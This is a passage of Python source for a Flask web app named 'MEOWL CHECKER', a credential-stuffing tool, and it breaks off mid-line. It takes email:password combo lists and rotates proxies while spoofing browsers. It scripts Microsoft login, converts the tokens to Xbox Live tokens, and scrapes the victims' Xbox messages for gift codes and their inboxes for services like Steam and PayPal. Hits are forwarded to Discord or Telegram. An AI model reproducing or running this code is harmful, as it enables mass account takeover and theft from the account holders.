#!/usr/bin/env python3
"""
MEOWL CHECKER — Web Edition v8
File: app.py
Run:  python3 app.py
"""

import subprocess, sys, os, json

def _ensure(pkg, module=None):
    module = module or pkg.split('[')[0].split('>')[0].split('<')[0].split('=')[0]
    try:
        __import__(module)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[!] pip install {pkg} failed: {e}")

for _p, _m in [("flask", "flask"), ("requests", "requests"), ("urllib3", "urllib3"), ("pysocks", "socks")]:
    _ensure(_p, _m)

import re, time, uuid, threading, zipfile, socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from collections import deque
from io import BytesIO
from typing import Dict, List, Optional, Any, Set
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from flask import Flask, request, jsonify, make_response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Settings =====
SETTINGS_FILE = "meowl_settings.json"
DEFAULT_SETTINGS = {
    "color_primary": "#00b4d8",
    "color_secondary": "#0077b6",
    "discord_webhook": "",
    "tg_token": "",
    "tg_chat_id": "",
    "discord_invite": "https://discord.gg/your-invite",
    "tg_invite": "https://t.me/your-channel"
}
SETTINGS = DEFAULT_SETTINGS.copy()

def load_settings():
    global SETTINGS
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as f:
                SETTINGS.update(json.load(f))
        except Exception:
            pass

def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump(SETTINGS, f, indent=4)
    except Exception:
        pass

load_settings()

# ===== Config =====
REQUEST_TIMEOUT     = 25
THREAD_JOIN_TIMEOUT = 5
HIT_FEED_SIZE       = 500
PORT_DEFAULT        = int(os.environ.get("PORT", 5000))
THREADS_MIN         = 1
THREADS_MAX         = 50
THREADS_DEFAULT     = 30

CODE_FETCH_PATTERN = re.compile(r'[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}')
_CODE_MSG_KEYS = {"text", "messageText", "content", "body", "message"}

COUNTRY_MAP = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AR":"Argentina","AU":"Australia",
    "AT":"Austria","AZ":"Azerbaijan","BH":"Bahrain","BD":"Bangladesh","BY":"Belarus",
    "BE":"Belgium","BZ":"Belize","BO":"Bolivia","BA":"Bosnia and Herzegovina","BR":"Brazil",
    "BN":"Brunei","BG":"Bulgaria","KH":"Cambodia","CM":"Cameroon","CA":"Canada","CL":"Chile",
    "CN":"China","CO":"Colombia","CR":"Costa Rica","HR":"Croatia","CU":"Cuba","CY":"Cyprus",
    "CZ":"Czech Republic","DK":"Denmark","DO":"Dominican Republic","EC":"Ecuador","EG":"Egypt",
    "SV":"El Salvador","EE":"Estonia","ET":"Ethiopia","FI":"Finland","FR":"France","DE":"Germany",
    "GH":"Ghana","GR":"Greece","GT":"Guatemala","HN":"Honduras","HK":"Hong Kong","HU":"Hungary",
    "IS":"Iceland","IN":"India","ID":"Indonesia","IR":"Iran","IQ":"Iraq","IE":"Ireland",
    "IL":"Israel","IT":"Italy","JM":"Jamaica","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KE":"Kenya","KW":"Kuwait","KG":"Kyrgyzstan","LA":"Laos","LV":"Latvia","LB":"Lebanon",
    "LY":"Libya","LT":"Lithuania","LU":"Luxembourg","MO":"Macao","MK":"Macedonia","MY":"Malaysia",
    "MV":"Maldives","MT":"Malta","MX":"Mexico","MD":"Moldova","MN":"Mongolia","ME":"Montenegro",
    "MA":"Morocco","MZ":"Mozambique","MM":"Myanmar","NP":"Nepal","NL":"Netherlands","NZ":"New Zealand",
    "NI":"Nicaragua","NG":"Nigeria","KP":"North Korea","NO":"Norway","OM":"Oman","PK":"Pakistan",
    "PS":"Palestine","PA":"Panama","PY":"Paraguay","PE":"Peru","PH":"Philippines","PL":"Poland",
    "PT":"Portugal","PR":"Puerto Rico","QA":"Qatar","RO":"Romania","RU":"Russia","RW":"Rwanda",
    "SA":"Saudi Arabia","RS":"Serbia","SG":"Singapore","SK":"Slovakia","SI":"Slovenia","SO":"Somalia",
    "ZA":"South Africa","KR":"South Korea","ES":"Spain","LK":"Sri Lanka","SD":"Sudan","SR":"Suriname",
    "SE":"Sweden","CH":"Switzerland","SY":"Syria","TW":"Taiwan","TJ":"Tajikistan","TZ":"Tanzania",
    "TH":"Thailand","TN":"Tunisia","TR":"Turkey","TM":"Turkmenistan","UA":"Ukraine","AE":"UAE",
    "GB":"United Kingdom","US":"United States","UY":"Uruguay","UZ":"Uzbekistan","VE":"Venezuela",
    "VN":"Vietnam","YE":"Yemen","ZM":"Zambia","ZW":"Zimbabwe",
}

def get_flag(cc):
    if not cc or len(cc) != 2: return ""
    cc = cc.upper()
    try:
        return chr(0x1F1E6 + ord(cc[0]) - ord('A')) + chr(0x1F1E6 + ord(cc[1]) - ord('A'))
    except Exception:
        return ""

def translate_country(cc):
    cc = (cc or "").upper().strip()
    name = COUNTRY_MAP.get(cc, cc)
    flag = get_flag(cc)
    return f"{name} {flag}" if flag else name

# ===== Proxy =====
def parse_proxy(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    if '://' in line: return line
    if '@' in line:   return f"http://{line}"
    parts = line.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

class ProxyPool:
    def __init__(self, proxies=None):
        self.proxies = list(proxies or [])
        self.dead = set()
        self.lock = threading.Lock()
        self.index = 0
        self.proxyless_mode = False

    def get(self):
        with self.lock:
            if self.proxyless_mode or not self.proxies:
                return None
            if len(self.dead) >= len(self.proxies):
                return "ALL_DEAD"
            
            for _ in range(len(self.proxies)):
                self.index = (self.index + 1) % len(self.proxies)
                p = self.proxies[self.index]
                if p not in self.dead:
                    return p
        return None

    def mark_dead(self, proxy):
        if proxy and proxy != "ALL_DEAD":
            with self.lock:
                self.dead.add(proxy)

    def __len__(self): 
        return max(0, len(self.proxies) - len(self.dead))
    
    def stats(self):
        with self.lock:
            return {
                "total": len(self.proxies),
                "dead": len(self.dead),
                "alive": max(0, len(self.proxies) - len(self.dead))
            }

# ===== Utility =====
def normalize_combo(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    for sep in [':', '|', ';', ',', ' ', '\t']:
        if sep in line:
            parts = line.split(sep, 1)
            email, password = parts[0].strip(), parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    return None

def create_optimized_session(threads=100, timeout=REQUEST_TIMEOUT, proxy=None):
    s = requests.Session()
    pool = threads + 50
    retry = Retry(total=1, backoff_factor=0.3,
                  status_forcelist=[429, 500, 502, 503, 504],
                  allowed_methods=["HEAD", "GET", "POST", "OPTIONS"])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool,
                          pool_maxsize=pool, pool_block=False)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.timeout = timeout
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s

def format_date(date_str: str) -> str:
    try:
        if not date_str: return "Unknown"
        date_str = date_str.replace('Z', '+00:00')
        return datetime.fromisoformat(date_str).strftime('%d/%m/%Y %H:%M')
    except Exception:
        return "Unknown"

def extract_message_details(msg: dict) -> dict:
    try:
        sender = "Unknown"
        if 'from' in msg and 'emailAddress' in msg['from']:
            sender = msg['from']['emailAddress'].get('address', 'Unknown')
        elif 'sender' in msg and 'emailAddress' in msg['sender']:
            sender = msg['sender']['emailAddress'].get('address', 'Unknown')
        subject = msg.get('subject', 'No Subject')
        date = msg.get('receivedDateTime', '')
        body = ""
        if 'body' in msg and 'content' in msg['body']:
            body = msg['body']['content']
        elif 'bodyPreview' in msg:
            body = msg['bodyPreview']
        if body:
            body = re.sub(r'<[^>]+>', ' ', body)
            body = re.sub(r'&nbsp;', ' ', body)
            body = re.sub(r'&[a-z]+;', ' ', body)
            body = re.sub(r'\s+', ' ', body).strip()
            if len(body) > 200: body = body[:200] + "..."
        return {'sender': sender, 'subject': subject, 'date': date, 'body_preview': body}
    except Exception:
        return {'sender': 'Unknown', 'subject': 'No Subject', 'date': '', 'body_preview': ''}

# ===== Notifications =====
def send_notifications(category, text):
    def _discord():
        url = SETTINGS.get("discord_webhook", "").strip()
        if not url: return
        try:
            requests.post(url, json={"content": f"**[{category}]** `{text}`"}, timeout=5)
        except Exception: pass

    def _telegram():
        token = SETTINGS.get("tg_token", "").strip()
        chat = SETTINGS.get("tg_chat_id", "").strip()
        if not token or not chat: return
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat, "text": f"[{category}] {text}", "parse_mode": "Markdown"}, timeout=5)
        except Exception: pass

    threading.Thread(target=_discord, daemon=True).start()
    threading.Thread(target=_telegram, daemon=True).start()

# ===== Code Fetcher =====
def _iter_code_messages(obj):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in _CODE_MSG_KEYS and isinstance(v, str):
                yield v
            else:
                yield from _iter_code_messages(v)
    elif isinstance(obj, list):
        for item in obj:
            yield from _iter_code_messages(item)

def _extract_codes_from_text(text) -> List[str]:
    return [m.upper() for m in CODE_FETCH_PATTERN.findall(str(text))]

def _get_ms_tokens(session):
    try:
        res = session.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en",
            timeout=15, verify=False
        )
        text = res.text
        ppft_pat  = re.compile(r'name=["\']PPFT["\'][^>]*value=["\']([^"\']+)["\']')
        ppft_pat2 = re.compile(r'value=["\']([^"\']+)["\'][^>]*name=["\']PPFT["\']')
        sft = (re.search(ppft_pat, text) or re.search(ppft_pat2, text)
               or re.search(r'sFTTag[^"]*?value=\\\"([^\\\"]+)\\\"', text)
               or re.search(r'value=\\\"(.+?)\\\"', text))
        post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)
        if sft and post:
            return post.group(1), sft.group(1)
        return None, None
    except Exception:
        return None, None

def _fetch_codes_for_account(email: str, password: str, proxy: Optional[str] = None,
                              diag: Optional[dict] = None) -> List[str]:
    if diag is None: diag = {}
    session = create_optimized_session(proxy=proxy)
    found_codes: List[str] = []
    try:
        url_post, sft_tag = _get_ms_tokens(session)
        diag['ppft_or_urlpost'] = bool(url_post and sft_tag)
        if not url_post: return found_codes

        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sft_tag}
        res = session.post(url_post, data=data, allow_redirects=True, timeout=15, verify=False)
        diag['login_final_url'] = (res.url or '')[:200]

        ms_token = None
        if '#' in res.url:
            ms_token = parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
        elif 'cancel?mkt=' in res.text:
            try:
                ipt   = re.search('(?<="ipt" value=").+?(?=">)', res.text).group()
                pprid = re.search('(?<="pprid" value=").+?(?=">)', res.text).group()
                uaid  = re.search('(?<="uaid" value=").+?(?=">)', res.text).group()
                post_url = re.search('(?<=id="fmHF" action=").+?(?=" )', res.text).group()
                ret = session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                   allow_redirects=True, verify=False)
                final_redirect = re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                fin = session.get(final_redirect, allow_redirects=True, verify=False)
                ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
            except Exception:
                pass
        diag['token_found'] = bool(ms_token)
        if not ms_token: return found_codes

        xbl_res = session.post(
            'https://user.auth.xboxlive.com/user/authenticate',
            json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                 "RpsTicket": ms_token},
                  "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xbl_res.status_code != 200: return found_codes
        xbl_data = xbl_res.json()
        try:
            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
            user_token = xbl_data['Token']
        except (KeyError, IndexError):
            return found_codes

        xsts_res = session.post(
            'https://xsts.auth.xboxlive.com/xsts/authorize',
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                  "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15, verify=False)
        if xsts_res.status_code != 200: return found_codes
        try: xsts_token = xsts_res.json()['Token']
        except KeyError: return found_codes

        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        msg_res = session.get(
            "https://xblmessaging.xboxlive.com/network/xbox/users/me/conversations/users/xuid(0)?maxItems=500",
            headers={"Authorization": auth_header, "x-xbl-contract-version": "1",
                     "Accept": "application/json"}, timeout=15, verify=False)
        if msg_res.status_code != 200: return found_codes
        for m in _iter_code_messages(msg_res.json()):
            found_codes.extend(_extract_codes_from_text(m))
        return found_codes
    except requests.exceptions.ProxyError:
        raise
    except Exception as e:
        diag['exception'] = str(e)[:200]
        return found_codes

# ===== Hotmail/Outlook =====
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None, threads=100):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session(threads, REQUEST_TIMEOUT, proxy=proxy)
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = ('https://login.live.com/oauth20_authorize.srf'
                           '?client_id=00000000402B5328'
                           '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
                           '&scope=service::user.auth.xboxlive.com::MBI_SSL'
                           '&display=touch&response_type=token&locale=en')
        self._keyword_messages = {}
        self._diag = {}

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                text = self.session.get(self.sFTTag_url, headers=headers,
                                        timeout=REQUEST_TIMEOUT, verify=False).text
                self._diag['page_len'] = len(text or '')
                match = (re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or
                         re.search('value="(.+?)"', text, re.S) or
                         re.search("sFTTag:'(.+?)'", text, re.S) or
                         re.search('sFTTag:"(.+?)"', text, re.S) or
                         re.search('name="PPFT".*?value="(.+?)"', text, re.S))
                if match:
                    sFTTag = match.group(1)
                    match = (re.search('"urlPost":"(.+?)"', text, re.S) or
                             re.search("urlPost:'(.+?)'", text, re.S) or
                             re.search('urlPost:"(.+?)"', text, re.S) or
                             re.search('<form.*?action="(.+?)"', text, re.S))
                    if match:
                        urlPost = match.group(1).replace('&amp;', '&')
                        self._diag['ppft_found'] = True
                        self._diag['urlpost_found'] = True
                        return urlPost, sFTTag
                if attempts == 0:
                    self._diag['page_snippet'] = (text or '')[:400]
            except requests.exceptions.ProxyError:
                raise
            except Exception as e:
                self._diag.setdefault('errors', []).append(str(e)[:120])
            attempts += 1
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email,
                        'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'close',
                }
                login_request = self.session.post(urlPost, data=data, headers=headers,
                                                  allow_redirects=True,
                                                  timeout=REQUEST_TIMEOUT, verify=False)
                self._diag['login_final_url'] = (login_request.url or '')[:200]
                self._diag['login_status'] = login_request.status_code

                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        self._diag['token_found'] =
